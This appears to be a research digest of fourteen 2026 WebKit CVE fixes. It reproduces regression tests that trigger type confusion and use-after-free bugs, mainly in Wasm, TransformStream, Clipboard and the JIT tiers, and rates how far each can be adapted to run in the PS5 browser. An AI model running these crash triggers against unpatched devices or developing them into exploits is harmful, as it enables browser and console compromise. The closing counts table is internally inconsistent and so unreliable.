# WebKit CVE Regression Tests — 2026

Extracted from upstream WebKit commits. Each entry contains the regression test
that demonstrates the behavioral change, the source-level fix summary, and a
PS5-browser adaptability assessment.

## Summary Table

| # | CVE | Commit | Date | Component | Test File | Adaptable? | Vulnerable Behavior | Patched Behavior |
|---|-----|--------|------|-----------|-----------|------------|---------------------|------------------|
| 1 | CVE-2026-86922 | af957bf204 | Feb 2026 | JSC / B3 ReduceStrength (Wasm GC) | `JSTests/wasm/gc/br_on_cast_fail.js` | **YES** | `fail()` returns 0 and/or `pass()` returns 0 after JIT — `br_on_cast_fail` negation is ignored → wrong branch taken → type confusion | Both return 1 (nonzero); no throw |
| 2 | CVE-2026-84635 | 9654ed7d9e | Mar 2026 | JSC / TypedArray `[[Set]]` | `JSTests/stress/reflect-set.js` (modified) | Partial | `Reflect.set(ta, 0, 42, receiver)` writes 42 into `ta[0]`; receiver unchanged — spec violation allows typed-array write through foreign receiver | `ta[0]` stays 0; value lands on `receiver[0]` instead |
| 3 | CVE-2026-43705 | 8fd92b1021 | Jun 2026 | WebCore / TransformStream | `LayoutTests/streams/transform-stream-poisoned-iterator-crash.html` | **YES** | Crash / memory corruption when `Array.prototype[Symbol.iterator]` is poisoned and `new TransformStream()` is called | `TypeError` is thrown; no crash |
| 4 | CVE-2026-43745 | 0f0de8f2a0 | Jul 2026 | JSC / Wasm streaming compiler | `JSTests/wasm/stress/streaming-compile-try-table-agreement.js` | **NO** | Streaming compiler accepts mixed legacy + spec EH instructions → OOB write during exception dispatch | `WebAssembly.CompileError` for mixed-EH modules; streaming/non-streaming agree |
| 5 | CVE-2026-64757 | 72272dcc4f | May 2026 | JSC / ScopedArgumentsTable | _(no regression test)_ | **NO** | `ScopeOffset` buffer allocated in Gigacage::Primitive — reachable via any Primitive-cage write primitive → unchecked index into lexical environment | Buffer moved to `Vector<ScopeOffset>` (fastMalloc); unreachable from Gigacage |
| 6 | CVE-2026-43663 | 13bfbf94f4 | Jun 2026 | JSC / DFG ConstantFoldingPhase | `JSTests/stress/resizable-array-constant-folding.js` | Partial | After `memory.grow(1)`, write through `Float64Array` view hits freed/stale backing store — UAF/crash | Write goes to newly grown backing store; no crash |
| 7 | CVE-2026-64715 | 1d5c10e2f9 | Aug 2026 | JSC / B3 ReduceStrength + PureCSE | _(C++ unit test only: `testb3_6.cpp`)_ | **NO** | `specializeSelect()` deletes an intermediate Check without updating PureCSE map → dangling pointer → UAF/crash | Check removed from PureCSE map before deletion |
| 8 | CVE-2026-43727 | c5036aadbd | Jul 2026 | WebCore / Clipboard API | `LayoutTests/editing/async-clipboard/clipboard-write-item-crash.html` | **YES** | Double `navigator.clipboard.write()` with same `ClipboardItem` → UAF in `clearItemTypeLoaders` → crash | No crash; completion handlers invoked safely via moved vector |
| 9 | CVE-2026-65334 | 9f07374e9e | Aug 2026 | JSC / Wasm OMG + B3 ReduceStrength | `JSTests/wasm/stress/omg-reduce-strength-select-exception-stackmap.js` | Partial | `specializeSelect` clones a call patchpoint carrying an exception-restoration stackmap → two call sites share one stackmap → type confusion / wrong restoration → crash | Call patchpoints marked `cloningForbidden` inside try; `specializeSelect` bails |
| 10 | CVE-2026-64787 | cb83583e5f | Jul 2026 | WebCore / Trusted Types | `LayoutTests/fast/dom/trusted-types-iframe-removal-crash.html` | **NO** | `trustedTypeCompliantString` holds raw `Document*`; iframe removal + GC frees document → UAF when the string is evaluated | `protect(contextDocument())` prevents premature deallocation |
| 11 | CVE-2026-43731 | 866892a305 | Jul 2026 | WebKit / GPUProcess UserMedia | `LayoutTests/ipc/usermedia-capture-start-producing-data-race.html` | **NO** | Repeated `StartProducingData` IPC → `prepareAudioDescription()` races `audioSamplesAvailable()` → UAF on ring buffer / semaphore | `start()` is a no-op when already observing media |
| 12 | CVE-2026-86986 | 410ce8dc41 | Oct 2026 | JSC / DFG+FTL DirectTailCall | `JSTests/stress/direct-tail-call-to-host-function-keeps-caller-code-alive.js` | **NO** | DirectTailCall to host function destroys caller frame → GC jettisons caller code → return into freed JIT memory → UAF | DirectTailCall to host routed through `DirectCallLinkInfo` thunk; caller code stays alive |
| 13 | CVE-2026-112697 | 91e125de4c | Oct 2026 | WebCore / CSSStyleSheet | _(no JS/HTML test — C++ fix only)_ | **NO** | `forEachStyleScope` iterates `m_adoptingTreeScopes` while lambda modifies it → iterator invalidation → UAF | Iterates a `copyToVectorOf` copy of the hash set |
| 14 | CVE-2026-112673 | d5af1b7159 | ~Oct 2026 | JSC / DFG GetByStatus | `JSTests/stress/get-by-status-fold-must-not-skip-base-static-property.js` | **NO** | `GetByStatus::computeFor` skips non-reified static properties on base structure → misfolding → type confusion (reads wrong value / wrong type) | Base structure's static property table consulted; fold is rejected |

---

## Detailed Entries

---

### 1. CVE-2026-86922 — Type Confusion in Wasm GC `br_on_cast_fail`

**Commit:** [`af957bf204`](https://github.com/WebKit/WebKit/commit/af957bf204)  
**Message:** `[JSC] Respect shouldNegate() on WasmRefTypeCheckValue nodes in OMG`  
**Fix:** `Source/JavaScriptCore/b3/B3ReduceStrength.cpp` — When strength-reducing a `WasmRefTest` node whose result feeds a branch, `shouldNegate()` was ignored, producing the wrong constant. The fix applies `!isSubtype` when `shouldNegate()` is true.

**Test:** `JSTests/wasm/gc/br_on_cast_fail.js`

```js
// (module
//  (rec
//    (type (;0;) (struct (field (mut i32))))
//    (type (;1;) (struct (field (mut i32)) (field (mut i64)) (field (mut i64))))
//  )
//  (type (;2;) (func (result (ref struct))))
//  (type (;3;) (func (result i32)))
//  (export "fail" (func 0))
//  (export "pass" (func 1))
//  (func (;0;) (type 3) (result i32)
//    block (type 2) (result (ref struct)) ;; label = @1
//      i32.const 42
//      struct.new 0
//      br_on_cast_fail 0 (;@1;) (ref struct) (ref 1)
//      drop
//      i32.const 0
//      return
//    end
//    drop
//    i32.const 1
//  )
//  (func (;1;) (type 3) (result i32)
//    block (type 2) (result (ref struct)) ;; label = @1
//      i32.const 99
//      i64.const 0
//      i64.const 0
//      struct.new 1
//      br_on_cast_fail 0 (;@1;) (ref struct) (ref 1)
//      drop
//      i32.const 1
//      return
//    end
//    drop
//    i32.const 0
//  )
// )

const bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,28,3,78,2,79,0,95,1,127,1,79,0,95,3,127,1,126,1,126,1,96,0,1,100,107,96,0,1,127,3,3,2,3,3,7,15,2,4,102,97,105,108,0,0,4,112,97,115,115,0,1,10,54,2,23,0,2,2,65,42,251,0,0,251,25,0,0,107,1,26,65,0,15,11,26,65,1,11,28,0,2,2,65,227,0,66,0,66,0,251,0,1,251,25,0,0,107,1,26,65,1,15,11,26,65,0,11]);
const mod = new WebAssembly.Module(bytes);
const { pass, fail } = new WebAssembly.Instance(mod).exports;

for (let i = 0; i < 200000; i++) {
    fail();
    pass();
}

if (fail() === 0 || pass() === 0)
    throw new Error("br_cast_on_fail incorrect");
```

**Vulnerable:** After JIT (200k iterations), `fail()` returns 0 or `pass()` returns 0 → Error thrown.  
**Patched:** Both consistently return 1; no error.  
**PS5 Adaptable:** **YES** — Pure WebAssembly + standard JS. No shell builtins. Requires Wasm GC support (`struct.new`, `br_on_cast_fail`). If PS5 WebKit lacks Wasm GC, the module won't compile (detection signal itself).

---

### 2. CVE-2026-84635 — TypedArray `[[Set]]` Receiver Check

**Commit:** [`9654ed7d9e`](https://github.com/WebKit/WebKit/commit/9654ed7d9e)  
**Message:** `[JSC] TypedArray [[Set]] should check receiver before writing to typed array`  
**Fix:** `JSGenericTypedArrayViewInlines.h` + `JSObject.cpp` — When receiver differs from the typed array, fall back to `OrdinarySet` for valid indices; return true without coercion for invalid indices.

**Test:** `JSTests/stress/reflect-set.js` (modified section)

```js
// Adapted snippet — the key behavioral test:
var ta = new Uint8Array(64);
var receiver = {};

var result = Reflect.set(ta, 0, 42, receiver);

// VULNERABLE: ta[0] === 42, receiver[0] === undefined
// PATCHED:    ta[0] === 0,  receiver[0] === 42
```

**Vulnerable:** `Reflect.set(ta, 0, 42, receiver)` writes 42 directly into `ta[0]`; receiver is ignored.  
**Patched:** `ta[0]` stays 0; `receiver[0]` gets 42 per spec (tc39/ecma262#1556).  
**PS5 Adaptable:** **Partial** — Core test is pure JS. The original file uses `shouldBe()` from `standalone-pre.js` and `transferArrayBuffer()`. The behavioral check above can be written standalone.

---

### 3. CVE-2026-43705 — TransformStream Type Confusion via Poisoned Iterator

**Commit:** [`8fd92b1021`](https://github.com/WebKit/WebKit/commit/8fd92b1021)  
**Message:** `[WebCore] TransformStream type confusion when Array.prototype[Symbol.iterator] is overridden`  
**Fix:** `TransformStream.cpp` — Replace `ASSERT(results.size() == 3)` (no-op in release) with runtime size check; null-check `jsDynamicCast` results; throw `TypeError` on failure.

**Test:** `LayoutTests/streams/transform-stream-poisoned-iterator-crash.html`

```html
<!DOCTYPE html>
<html>
<body>
<p>Tests that constructing a TransformStream does not crash when
Array.prototype[Symbol.iterator] has been poisoned to return
wrong-type objects.</p>
<div id="result"></div>
<script>
const originalIterator = Array.prototype[Symbol.iterator];

function check(label, fn) {
    let message;
    try {
        fn();
        message = "FAIL: " + label + " did not throw";
    } catch (e) {
        if (e instanceof TypeError)
            message = "PASS: " + label + " threw TypeError";
        else
            message = "FAIL: " + label + " threw " + e;
    }
    const div = document.createElement("div");
    div.textContent = message;
    document.getElementById("result").appendChild(div);
}

// Variant 1: substitute plain objects for the readable/writable slots.
Array.prototype[Symbol.iterator] = function() {
    const arr = this;
    let i = 0;
    return {
        next() {
            if (i >= arr.length)
                return { done: true };
            let val = arr[i];
            if (arr.length === 3 && i >= 1)
                val = { fake: true };
            i++;
            return { value: val, done: false };
        }
    };
};
check("plain-object substitution", () => new TransformStream());

// Variant 2: substitute an object that holds a heap pointer.
let buf = new ArrayBuffer(65536);
Array.prototype[Symbol.iterator] = function() {
    const arr = this;
    let i = 0;
    return {
        next() {
            if (i >= arr.length)
                return { done: true };
            let val = arr[i];
            if (arr.length === 3 && i >= 1)
                val = { pad: 0, ptr: buf };
            i++;
            return { value: val, done: false };
        }
    };
};
check("object-reference substitution", () => new TransformStream());

// Variant 3: truncated iterator returning fewer than 3 entries.
Array.prototype[Symbol.iterator] = function() {
    return { next() { return { done: true }; } };
};
check("truncated iterator", () => new TransformStream());

Array.prototype[Symbol.iterator] = originalIterator;
</script>
</body>
</html>
```

**Vulnerable:** Crash / memory corruption (controlled `m_wrapped` deref, write-increment via `Ref<>::ref()`, vtable call on attacker data).  
**Patched:** All three variants throw `TypeError`; no crash.  
**PS5 Adaptable:** **YES** — Pure web APIs (`TransformStream`, `Symbol.iterator`). Remove `testRunner` calls. The three `check()` calls work standalone.

---

### 4. CVE-2026-43745 — Wasm Streaming Compiler Mixed EH OOB Write

**Commit:** [`0f0de8f2a0`](https://github.com/WebKit/WebKit/commit/0f0de8f2a0)  
**Message:** `Streaming compiler does not reject mixed legacy and spec-correct EH`  
**Fix:** `WasmEntryPlan.cpp`, `WasmIPIntPlan.cpp` — Enforce that streaming compilation also rejects modules mixing legacy and spec-correct exception handling instructions.

**Test:** `JSTests/wasm/stress/streaming-compile-try-table-agreement.js`

```js
// Uses $vm.createWasmStreamingCompilerForInstantiate — JSC shell-only API
// Full test omitted; key behavior: both streaming and non-streaming paths
// must agree on CompileError for mixed legacy+spec EH modules.
```

**Vulnerable:** Streaming compiler silently accepts mixed legacy + try_table EH → exception dispatch can OOB-write.  
**Patched:** Both streaming and non-streaming raise `WebAssembly.CompileError`.  
**PS5 Adaptable:** **NO** — Requires `$vm.createWasmStreamingCompilerForInstantiate` (jsc shell builtin). Cannot be replicated with standard web APIs. Could partially test via `WebAssembly.compileStreaming()` with a `Response` object, but the module bytes require the legacy EH opcodes which may not be relevant on PS5's Wasm version.

---

### 5. CVE-2026-64757 — ScopedArgumentsTable Gigacage Escape

**Commit:** [`72272dcc4f`](https://github.com/WebKit/WebKit/commit/72272dcc4f)  
**Message:** `[JSC] ScopedArgumentsTable ScopeOffset buffer should allocate from fastMalloc`  
**Fix:** `ScopedArgumentsTable.h/cpp` — Replace `CagedUniquePtr<Gigacage::Primitive, ScopeOffset>` with `Vector<ScopeOffset>` so the buffer is in fastMalloc, not the Primitive Gigacage.

**Test:** _(none — hardening change with no behavioral regression test)_

**Vulnerable:** `m_arguments` buffer sits in Gigacage::Primitive, reachable via any Primitive-cage write primitive → arbitrary `ScopeOffset` manipulation → unchecked index into `JSLexicalEnvironment::variables()`.  
**Patched:** Buffer in fastMalloc; unreachable from Gigacage writes.  
**PS5 Adaptable:** **NO** — No test to run. This is an exploit-primitive hardening; detection would require an existing Gigacage write primitive.

---

### 6. CVE-2026-43663 — UAF via Wasm Memory Grow + DFG Constant Folding

**Commit:** [`13bfbf94f4`](https://github.com/WebKit/WebKit/commit/13bfbf94f4)  
**Message:** `[JSC] Use-after-free after Wasm memory grow via stale pointer folded by DFGConstantFoldingPhase`  
**Fix:** `DFGConstantFoldingPhase.cpp` — Exempt resizable/growable-shared TypedArray views from `GetIndexedPropertyStorage` constant folding, since `resize()`/`memory.grow()` can reallocate the backing store.

**Test:** `JSTests/stress/resizable-array-constant-folding.js`

```js
//@ runDefault("--useConcurrentJIT=false")
const memories = [];

(function() {
    while (true) {
        try {
            memories.push(new WebAssembly.Memory({initial: 65535, maximum: 65536}));
        } catch (e) {
            break;
        }
    }
})();

const memory = new WebAssembly.Memory({initial: 1, maximum: 100});
const buffer = memory.toResizableBuffer();
const view = new Float64Array(buffer);

function trigger(val) {
    view[0] = val;
}

for (let i = 0; i < 10000; i++) {
    trigger(13.37);
}

memory.grow(1);
trigger(1.1);
```

**Vulnerable:** After `memory.grow(1)`, `trigger(1.1)` writes to the old (freed) backing store → UAF/crash.  
**Patched:** Write goes to the newly grown backing store; no crash.  
**PS5 Adaptable:** **Partial** — Requires `WebAssembly.Memory.toResizableBuffer()` (relatively new API). The `--useConcurrentJIT=false` flag is needed to ensure deterministic JIT folding. Memory-pressure setup (allocating near-max memories) may not work within PS5 memory limits. Core concept is testable if `toResizableBuffer()` is available.

---

### 7. CVE-2026-64715 — B3 ReduceStrength Select + Dead Check CSE UAF

**Commit:** [`1d5c10e2f9`](https://github.com/WebKit/WebKit/commit/1d5c10e2f9)  
**Message:** `[JSC] Fix B3 ReduceStrength Select specialization when a Check appears between the Select and triggering Check`  
**Fix:** `B3PureCSE.cpp`, `B3ReduceStrength.cpp` — Remove values from PureCSE map before `deleteValue()` during `specializeSelect()`.

**Test:** C++ unit test only (`Source/JavaScriptCore/b3/testb3_6.cpp` — `testCheckSelectAndDeadCheckCSE`)

**Vulnerable:** Dangling pointer in PureCSE map → UAF when CSE later looks up the deleted Check.  
**Patched:** Check removed from `m_pureCSE` before deletion.  
**PS5 Adaptable:** **NO** — Internal B3 compiler test; no JavaScript-level reproducer provided.

---

### 8. CVE-2026-43727 — Clipboard API UAF in clearItemTypeLoaders

**Commit:** [`c5036aadbd`](https://github.com/WebKit/WebKit/commit/c5036aadbd)  
**Message:** `Heap use-after-free in ClipboardItemBindingsDataSource::clearItemTypeLoaders()`  
**Fix:** `ClipboardItemBindingsDataSource.cpp` — Move `m_itemTypeLoaders` to a local via `std::exchange` before iterating; prevents the completion handler callbacks from mutating the vector being iterated.

**Test:** `LayoutTests/editing/async-clipboard/clipboard-write-item-crash.html`

```html
<!DOCTYPE html>
<body><script>
(async () => {
  const item = new ClipboardItem({
    "text/plain": new Promise(() => {}),
    "text/html":  Promise.resolve("x"),
    "text/uri-list": Promise.resolve("http://a/")
  });

  navigator.clipboard.write([item]).catch(() => {});

  await 0; // Drain microtasks

  navigator.clipboard.write([item]).catch(() => {});

  document.body.innerHTML = '<p>PASS - no crash</p>';
})();
</script>
```

**Vulnerable:** Second `clipboard.write()` with the same `ClipboardItem` triggers `clearItemTypeLoaders()` while the first is still resolving → UAF → crash under ASAN.  
**Patched:** No crash; completion handlers fire safely.  
**PS5 Adaptable:** **YES** — Standard Clipboard API. Requires `navigator.clipboard.write()` support and user-gesture permissions. The crash is the signal; if the page survives, the engine is patched. Note: PS5 browser may require user activation for clipboard access.

---

### 9. CVE-2026-65334 — Wasm OMG Patchpoint Cloning in Try Block

**Commit:** [`9f07374e9e`](https://github.com/WebKit/WebKit/commit/9f07374e9e)  
**Message:** `[JSC] Do not clone patchpoints for Wasm calls within a try block`  
**Fix:** `B3ReduceStrength.cpp`, `WasmOMGIRGenerator.cpp` — Mark call patchpoints `cloningForbidden` when inside a try block; bail from `specializeSelect()` when cloning-forbidden values are in range.

**Test:** `JSTests/wasm/stress/omg-reduce-strength-select-exception-stackmap.js`

The test hand-assembles a Wasm module with a `try` block containing a `select` + call + `ref.as_non_null`, forces OMG tier-up, and checks that exception restoration preserves the correct externref. ~151 lines, uses `wasmTestLoopCount` (jsc shell global).

**Vulnerable:** `specializeSelect` clones a call patchpoint carrying an exception-restoration stackmap → two call sites share one stackmap → wrong live-value restoration → type confusion / null deref / crash.  
**Patched:** Call patchpoints inside try are not cloneable; select specialization bails.  
**PS5 Adaptable:** **Partial** — The Wasm module construction is pure JS, but the test relies on `wasmTestLoopCount` (replaceable with a constant like `100000`) and the Wasm module uses legacy EH opcodes (`try`/`catch_all`) plus GC types. Could work if `wasmTestLoopCount` is replaced and the PS5 Wasm engine supports both.

---

### 10. CVE-2026-64787 — Document UAF in trustedTypeCompliantString

**Commit:** [`cb83583e5f`](https://github.com/WebKit/WebKit/commit/cb83583e5f)  
**Message:** `Use-after-free of Document in trustedTypeCompliantString`  
**Fix:** `Document.cpp` — Wrap `contextDocument()` in `protect()` before passing to `trustedTypeCompliantString`, preventing GC from freeing the Document during the call.

**Test:** `LayoutTests/fast/dom/trusted-types-iframe-removal-crash.html`

Requires `testRunner`, `GCController`, CSP `require-trusted-types-for 'script'`, iframe cross-document adoption, and forced GC.

**Vulnerable:** `contextDocument()` returns a raw pointer; iframe removal + forced GC frees the Document → UAF when `trustedTypeCompliantString` accesses it.  
**Patched:** `protect()` prevents premature deallocation.  
**PS5 Adaptable:** **NO** — Requires `GCController.collect()`, CSP Trusted Types policy creation across frame boundaries, and `testRunner`. Cannot be meaningfully adapted.

---

### 11. CVE-2026-43731 — GPUProcess UserMedia Race Condition

**Commit:** [`866892a305`](https://github.com/WebKit/WebKit/commit/866892a305)  
**Message:** `[CoreIPC][GPUProcess] UserMediaCaptureManagerProxy::startProducingData races prepareAudioDescription() against audioSamplesAvailable()`  
**Fix:** `UserMediaCaptureManagerProxy.cpp` — Make `start()` a no-op when already observing media. Prevents re-entrant `prepareAudioDescription` from racing the capture thread.

**Test:** `LayoutTests/ipc/usermedia-capture-start-producing-data-race.html`

Requires `IPCTestingAPIEnabled`, raw IPC message injection via `CoreIPC.GPU.UserMediaCaptureManagerProxy.StartProducingData`, and `getUserMedia`.

**Vulnerable:** Repeated `StartProducingData` IPC messages → `prepareAudioDescription()` races `audioSamplesAvailable()` on the capture WorkQueue → heap UAF on `ProducerSharedCARingBuffer` / `IPC::Semaphore`.  
**Patched:** Second and subsequent `start()` calls are no-ops.  
**PS5 Adaptable:** **NO** — Requires IPC Testing API (debug-only WebKit feature) and direct IPC message injection. Not available in release builds or PS5 browser.

---

### 12. CVE-2026-86986 — DFG/FTL DirectTailCall JIT Code UAF

**Commit:** [`410ce8dc41`](https://github.com/WebKit/WebKit/commit/410ce8dc41)  
**Message:** `[JSC] UAF of JIT code: DFG/FTL DirectTailCall to a host function leaves the caller's CodeBlock unrooted during the call`  
**Fix:** `DFGSpeculativeJIT64.cpp`, `FTLLowerDFGToB3.cpp` — Route DirectTailCall to host functions through `DirectCallLinkInfo` path instead of inline C call; the thunk is kept alive via the callee.

**Test:** `JSTests/stress/direct-tail-call-to-host-function-keeps-caller-code-alive.js`

```js
//@ skip if $secAccel3Removed
//@ requireOptions("--sweepSynchronously=1", "--zeroExecutableMemoryOnFree=1")

// [Uses noInline(), gc(), Function constructor tricks, and specific
//  JIT policy flags to force the tail-call code path and trigger
//  GC during a host function call]
```

**Vulnerable:** `prepareForTailCall` destroys caller frame; GC during host call frees caller's JIT code → return into freed memory.  
**Patched:** DirectTailCall to host uses `DirectCallLinkInfo` thunk; caller code stays alive.  
**PS5 Adaptable:** **NO** — Requires `noInline()`, `--sweepSynchronously`, `--zeroExecutableMemoryOnFree`, `gc()`, `$secAccel3Removed`. All are jsc shell builtins.

---

### 13. CVE-2026-112697 — CSSStyleSheet Iterator Invalidation UAF

**Commit:** [`91e125de4c`](https://github.com/WebKit/WebKit/commit/91e125de4c)  
**Message:** `CSSStyleSheet::forEachStyleScope: iterate through a copy of m_adoptingTreeScopes`  
**Fix:** `CSSStyleSheet.cpp` — Use `copyToVectorOf` to snapshot the hash set before iterating, preventing the lambda from invalidating the iterator.

**Test:** _(no JS/HTML regression test — C++ fix only)_

**Vulnerable:** `forEachStyleScope` iterates `m_adoptingTreeScopes` directly; the lambda can modify the hash set → iterator invalidation → UAF/crash.  
**Patched:** Iterates a vector copy; original hash set can be mutated safely.  
**PS5 Adaptable:** **NO** — No test to run. Would require a constructed scenario with adopted stylesheets across multiple shadow roots that are modified during style resolution.

---

### 14. CVE-2026-112673 — DFG GetByStatus Static Property Misfolding

**Commit:** [`d5af1b7159`](https://github.com/WebKit/WebKit/commit/d5af1b7159)  
**Message:** `[JSC] GetByStatus::computeFor's prototype walk must not skip a base structure's non-reified static properties`  
**Fix:** `GetByStatus.cpp`, `PropertyCondition.cpp`, `PutByStatus.cpp`, `DFGGraph.cpp`, `Structure.h` — Consult the non-reified static property table on the base structure before concluding a property is absent.

**Test:** `JSTests/stress/get-by-status-fold-must-not-skip-base-static-property.js`

```js
//@ skip if $secAccel3Removed
//@ runDefault("--jitPolicyScale=0")

// Sets Function.prototype.input to a shadow object, then accesses
// RegExp.input (a non-reified static property). DFG folds the lookup
// to the prototype's value instead of the static property.

function shouldBe(actual, expected) {
    if (actual !== expected)
        throw new Error(`bad value: expected ${expected} but got ${describe(actual)}`);
}

let shadow = {};
shadow.p0 = 1;
shadow.y = 13.37;
Function.prototype.input = shadow;

function setup(a) { return a.input; }
noInline(setup);
let setupObj = Object.create(Function.prototype);
for (let i = 0; i < 5000; i++)
    setup(setupObj);

let subject = "q0002048";
subject.match(/.*/);

RegExp.x = 1;

function f(a, n) {
    let b = a;
    if (n > 0) {
        let r = a.input;
        return r.y;
    }
    b.x; b.x; b.x;
    return undefined;
}
noInline(f);

// VULNERABLE: f(RegExp, 1) returns 13.37 (misfolded to shadow.y)
// PATCHED:    f(RegExp, 1) returns undefined (RegExp.input is the
//             matched string, which has no .y property)
```

**Vulnerable:** `f(RegExp, 1)` returns `13.37` — DFG folded `RegExp.input` to the prototype chain's shadow object, skipping the static `RegExp.input` property.  
**Patched:** Returns `undefined` — `RegExp.input` correctly resolves to the last-matched string (which has no `.y`).  
**PS5 Adaptable:** **NO** — Requires `noInline()`, `describe()`, `--jitPolicyScale=0`, `gc()`, `$secAccel3Removed`. All are jsc shell builtins.

---

## PS5 Browser Adaptability Summary

| Verdict | Count | CVEs |
|---------|-------|------|
| **YES** — runs in browser as-is or with trivial changes | 3 | 86922, 43705, 43727 |
| **Partial** — core concept works but needs shell-builtin removal or API availability check | 4 | 84635, 43663, 65334, (86922 if no Wasm GC) |
| **NO** — requires jsc shell, IPC API, GCController, or has no test | 7 | 43745, 64757, 64715, 64787, 43731, 86986, 112697, 112673 |

### Notes for PS5 Adaptation

1. **Shell builtins to remove/replace:** `$vm.*`, `shouldBe()`, `noInline()`, `gc()`, `describe()`, `$secAccel3Removed`, `wasmTestLoopCount`, `transferArrayBuffer()`
2. **JIT flags** (`--useConcurrentJIT=false`, `--jitPolicyScale=0`, `--sweepSynchronously=1`) cannot be set in a browser; tests relying on specific JIT tier-up timing may be non-deterministic.
3. **WebAssembly GC** (`struct.new`, `br_on_cast_fail`) may not be supported on PS5 14.10's WebKit fork.
4. **`toResizableBuffer()`** is a recent WebAssembly.Memory extension; availability on PS5 is unknown.
5. **Clipboard API** tests require user activation (gesture) on most browsers; wrap in a click handler for PS5.
6. **TransformStream** test (CVE-2026-43705) is the most reliable browser-side detector — pure DOM, no special APIs, crash-vs-TypeError is a clean signal.
